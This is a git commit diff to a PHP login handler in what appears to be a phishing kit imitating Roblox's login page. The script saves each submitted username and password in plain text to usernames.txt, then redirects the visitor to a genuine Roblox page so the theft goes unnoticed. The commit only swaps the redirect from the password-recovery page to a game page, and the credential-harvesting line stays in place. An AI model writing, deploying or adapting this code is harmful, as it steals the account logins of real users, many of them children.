8e828bf3a240a18d82165a5bd58ec572c0ac2529
Yagiz003 <98309766+Yagiz003@users.noreply.github.com>
2023-12-26 18:17:02 +0300

    Update login.php

--- .sites/roblox/login.php
+++ .sites/roblox/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.roblox.com/login/forgot-password-or-username/');
+header('Location: https://www.roblox.com/games/13775256536/EP-68-PART-2-Toilet-Tower-Defense/');
 exit();
 ?>
